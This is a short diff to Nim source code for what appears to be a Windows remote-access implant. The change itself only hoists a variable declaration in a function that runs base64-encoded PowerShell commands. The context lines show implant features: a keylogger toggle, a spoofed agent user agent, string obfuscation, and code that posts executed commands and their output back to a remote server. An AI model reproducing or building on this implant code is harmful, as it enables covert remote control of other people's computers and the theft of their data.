@@ -49,6 +49,7 @@ proc is_elevated(): string
 let client = newHttpClient(userAgent=get_windows_agent_id())
 var keylog_on: bool
 
+
 #########################
 ### Command executors ###
 #########################
@@ -116,6 +117,8 @@ proc collect_data(): bool =
 proc wrap_execute_encoded_powershell(encoded_powershell_command: string, ps_module=""): bool = 
     var output: string
     var is_success: bool
+    var data: OrderedTable[system.string, system.string]
+
     # execute the powershell scriptblock
     try:
         output = execute_encoded_powershell(encoded_powershell_command)
@@ -124,7 +127,7 @@ proc wrap_execute_encoded_powershell(encoded_powershell_command: string, ps_modu
     
     # command came from "iex" module
     if ps_module == "":
-        var data = {
+        data = {
             protectString("powershell_command"): decode_64(encoded_powershell_command),
             "output": output
         }.toOrderedTable()
@@ -132,7 +135,7 @@ proc wrap_execute_encoded_powershell(encoded_powershell_command: string, ps_modu
     
     # command came from ps_module
     else:
-        var data = {
+        data = {
             "output": output
         }.toOrderedTable()
         is_success = post_data(client, ps_module, $data)
